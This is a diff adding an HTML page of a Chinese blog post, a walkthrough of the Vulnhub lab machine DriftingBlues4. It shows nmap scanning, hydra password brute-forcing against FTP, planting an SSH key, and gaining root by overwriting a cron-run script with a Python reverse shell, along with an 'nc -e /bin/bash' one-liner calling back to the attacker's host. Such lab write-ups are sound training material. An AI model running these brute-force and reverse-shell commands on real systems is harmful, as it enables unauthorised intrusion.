@@ -1,0 +1,198 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vulnhub系列-Driftingblues4 | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
+
+  
+  <meta name="author" content="Aesm1p">
+  
+
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="bruteForce">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Vulnhub系列-Driftingblues4"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Vulnhub系列-Driftingblues4</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/06/07/vulnhubDriftingblues4/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-06-07T12:23:22.000Z">
+          2021-06-07
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><img src="/2021/06/07/vulnhubDriftingblues4/vulnhubDriftingblues4" alt></p>
+<a id="more"></a>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.111</span><br></pre></td></tr></table></figure>
+<p>开放端口为21,22，80端口</p>
+<p><strong>21</strong>端口</p>
+<p>21端口尝试匿名登录没什么收获</p>
+<p><strong>80端口</strong></p>
+<p>查看源代码，可以看到一段base64密文，该密文多层base64加密，最终解密之后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go back intruder!!! </span><br><span class="line">tight security drippin </span><br><span class="line">i hope you&#39;re an employee</span><br><span class="line">&#x2F;imfuckingmad.txt</span><br></pre></td></tr></table></figure>
+<p>访问/imfuckingmad.txt页面，是一段brainfuck编码的字符，解码一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">man we are a tech company and still getting hacked??? what the shit??? enough is enough!!! </span><br><span class="line">#</span><br><span class="line">##</span><br><span class="line">...</span><br><span class="line">#</span><br><span class="line">&#x2F;iTiS3Cr3TbiTCh.png</span><br></pre></td></tr></table></figure>
+<p>访问该图片发现是一个二维码，指向一个网址，是一张图片</p>
+<p><img src="/2021/06/07/vulnhubDriftingblues4/1.png" alt></p>
+<p>给了一些用户名，收集信息发现ssh只支持公钥登录，那么就只能在ftp上使用了，所以我们进行密码爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l luther -P &#x2F;opt&#x2F;SecLists&#x2F;Passwords&#x2F;Common-Credentials&#x2F;common-passwords-win.txt 192.168.56.111 ftp</span><br></pre></td></tr></table></figure>
+<p>但是爆破失败，无奈动用更大字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P &#x2F;opt&#x2F;SecLists&#x2F;Passwords&#x2F;Common-Credentials&#x2F;best1050.txt 192.168.56.111 ftp</span><br></pre></td></tr></table></figure>
+<p>终于成功！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[21][ftp] host: 192.168.56.111   login: hubert   password: john316</span><br></pre></td></tr></table></figure>
+<p>使用此账号登录ftp</p>
+<p>登录之后啥也没有，只是有一个hubert的空目录，猜测该目录即为hubert用户的家目录，所以我们可以向该目录上传一个公钥从而使用公钥远程ssh登录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> hubert</span></span><br><span class="line">250 CWD command successful</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> mkdir .ssh</span></span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> put authorized_keys</span></span><br></pre></td></tr></table></figure>
+<p>然后ssh登录，可以看到第一段flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hubert@driftingblues:~$ id</span><br><span class="line">uid&#x3D;1001(hubert) gid&#x3D;1001(hubert) groups&#x3D;1001(hubert)</span><br><span class="line">hubert@driftingblues:~$ ls</span><br><span class="line">emergency.py  user.txt</span><br><span class="line">hubert@driftingblues:~$ cat user.txt</span><br><span class="line">flag 1&#x2F;2</span><br></pre></td></tr></table></figure>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看家目录下的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hubert@driftingblues:~$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwx------ 4 hubert hubert 4096 Jun  7 10:09 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Jan  9 13:44 ..</span><br><span class="line">-rwx------ 1 hubert hubert    1 Jun  7 10:09 .bash_history</span><br><span class="line">-rwx------ 1 hubert hubert    1 Jun  7 10:09 .bashrc</span><br><span class="line">-rwxr-xr-x 1 root   root    217 Jan  9 13:43 emergency.py</span><br><span class="line">drwx------ 3 hubert hubert 4096 Jun  7 10:05 .gnupg</span><br><span class="line">drwx------ 2 hubert hubert 4096 Jun  7 10:05 .ssh</span><br><span class="line">-rwx------ 1 hubert hubert 1805 Jan  3 11:56 user.txt</span><br></pre></td></tr></table></figure>
+<p>可以看到存在一个emergency.py的属于root的文件，应该可以用来提权，文件内容如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'echo 1 &gt;&gt; /tmp/backdoor_testing'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># template python script for backdoor purposes</span></span><br><span class="line"><span class="comment"># i'm gonna leave it with loose permissions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># say africa without a's</span></span><br></pre></td></tr></table></figure>
+<p>进行进程监控发现该python文件会被定时执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021&#x2F;06&#x2F;07 10:14:01 CMD: UID&#x3D;0    PID&#x3D;4826   | python &#x2F;home&#x2F;hubert&#x2F;emergency.py</span><br></pre></td></tr></table></figure>
+<p>之前我看到755以为不能删除文件，但是其实是可以删除的，那么就简单了，我们删除改文件然后在新建一个同名的反弹shell的python代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.56.108"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure>
+<p>也可以通过nc命令提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.56.108 8080</span><br></pre></td></tr></table></figure>
+<p>然后再kali上监听端口即可getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -lvvp 8080                                                                                                   1 ⨯</span><br><span class="line">listening on [any] 8080 ...</span><br><span class="line">192.168.56.111: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.111] 34826</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line"># ls &#x2F;root</span><br><span class="line">root.txt</span><br><span class="line">sync</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt</span><br><span class="line">flag 2&#x2F;2</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/vulnhub/">vulnhub</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/bruteForce/">bruteForce</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
